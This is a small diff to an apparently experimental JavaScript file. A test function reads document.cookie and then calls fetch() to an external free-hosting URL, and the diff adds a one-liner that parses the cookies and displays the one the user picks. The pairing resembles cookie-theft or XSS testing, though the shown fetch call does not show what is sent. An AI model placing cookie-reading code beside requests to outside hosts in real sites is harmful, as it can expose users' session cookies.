@@ -1,5 +1,3 @@
-
-
 function test() {
     alert(document.cookie);
     fetch('https://sci2u.000webhostapp.com/', {
@@ -18,6 +16,11 @@ function getCookie(cname) {
         if (c.indexOf(name) == 0) return c.substring(name.length,c.length);
     }
     return "";
+    
+}
+
+function whichCookie() {
+    javascript:alert( document.cookie.split( ';' ).map( function( x ) { return x.trim().split( /(=)/ ); } ).reduce( function( a, b ) { a[ b[ 0 ] ] = a[ b[ 0 ] ] ? a[ b[ 0 ] ] + ', ' + b.slice( 2 ).join( '' ) : b.slice( 2 ).join( '' ); return a; }, {} )[ prompt( 'Which Cookie?' ) ] );
 }
 
 //test22
